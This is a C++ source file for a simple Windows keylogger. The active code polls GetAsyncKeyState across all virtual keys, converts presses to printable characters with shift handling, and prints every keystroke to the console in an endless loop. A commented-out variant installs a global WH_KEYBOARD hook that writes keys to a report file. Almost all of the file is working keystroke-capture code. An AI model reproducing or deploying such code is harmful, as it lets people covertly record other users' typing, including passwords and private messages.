#include <iostream>
#include <fstream>
#include <Windows.h>

#define NUM_OF_KEYS 255
#define LOWEST_PRINTABLE '!'
#define HIGHEST_PRINTABLE '~'

/*
HHOOK hkb;

LRESULT  CALLBACK KeyboardProc(int nCode, WPARAM wParam,
    LPARAM lParam)
{
    char ch;
    if (((DWORD)lParam & 0x40000000) && (HC_ACTION == nCode))
    {
        std::fstream file("K:\\Programming\\keyLogger\\keyLogger\\keyLogger\\report.txt");

        file << wParam;
        file.close();
    }

    LRESULT RetVal = CallNextHookEx(NULL, nCode, wParam, lParam);
    return  RetVal;
}

BOOL installhook()
{
    hkb = SetWindowsHookEx(WH_KEYBOARD, (HOOKPROC)KeyboardProc, NULL, 0);

    return TRUE;
}
*/




int checkShiftChars()
{
    if (GetAsyncKeyState(VK_SHIFT))
        return TRUE;

    return FALSE;
}

char formatShiftedKeys(char keyChar)
{
    char shiftedChar = keyChar;

    switch (keyChar)
    {
    case '0':
        shiftedChar = ')';
        break;
    case '1':
        shiftedChar = '!';
        break;
    case '2':
        shiftedChar = '@';
        break;
    case '3':
        shiftedChar = '#';
        break;
    case '4':
        shiftedChar = '$';
        break;
    case '5':
        shiftedChar = '%';
        break;
    case '6':
        shiftedChar = '^';
        break;
    case '7':
        shiftedChar = '&';
        break;
    case '8':
        shiftedChar = '*';
        break;
    case '9':
        shiftedChar = '(';
        break;
    case '-':
        shiftedChar = '_';
        break;
    case '=':
        shiftedChar = '+';
        break;
    case '`':
        shiftedChar = '~';
        break;
    case ';':
        shiftedChar = ':';
        break;
    case '\'':
        shiftedChar = '\"';
        break;
    case ',':
        shiftedChar = '<';
        break;
    case '.':
        shiftedChar = '>';
        break;
    case '/':
        shiftedChar = '?';
        break;
    case '[':
        shiftedChar = '{';
        break;
    case ']':
        shiftedChar = '}';
        break;
        

    default:
        break;

    }

    return shiftedChar;
}

char filterPrintable(char keyChar)
{
    if (keyChar >= LOWEST_PRINTABLE && keyChar <= HIGHEST_PRINTABLE)
        return keyChar;

    return 0;
}

char convertToLowerCase(char letter)
{
    return letter + 32;
}

/*
A function that checks if any key was pressed on the keyboard, except for the Shift keys.
(They have a special use)
*/
char keyWasPressed()
{
    int keyStat = 0;
    char keyChar = 0;

    for (int i = 0; i < NUM_OF_KEYS; i++)
    {
        keyStat = GetAsyncKeyState(i);

        if ((keyStat & 0x1) && GetAsyncKeyState(VK_SHIFT) && i != VK_SHIFT && i != VK_RSHIFT && i != VK_LSHIFT)
        {
            keyChar = filterPrintable((char)MapVirtualKey(i, MAPVK_VK_TO_CHAR));
            keyChar = formatShiftedKeys(keyChar);
            i = NUM_OF_KEYS;
        }
        else if (keyStat & 0x1)
        {
            keyChar = filterPrintable((char)MapVirtualKey(i, MAPVK_VK_TO_CHAR));

            if (keyChar >= 'A' && keyChar <= 'Z')
                keyChar = convertToLowerCase(keyChar);

            i = NUM_OF_KEYS;
        }

    }

    return keyChar;
}

int main()
{
    /*
    FILE* file = fopen("K:\\Programming\\keyLogger\\keyLogger\\keyLogger\\report.txt", "w");
    fclose(file);
    installhook();

    MSG msg;
    while (!GetMessage(&msg, NULL, NULL, NULL)) {    //this while loop keeps the hook
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }

    UnhookWindowsHookEx(hkb);

    std::cout << "Done!\n";
    */
    MSG msg;
    while(TRUE)
    {

        std::cout << keyWasPressed();
        Sleep(120);
        
    }
    
	return 0;
}


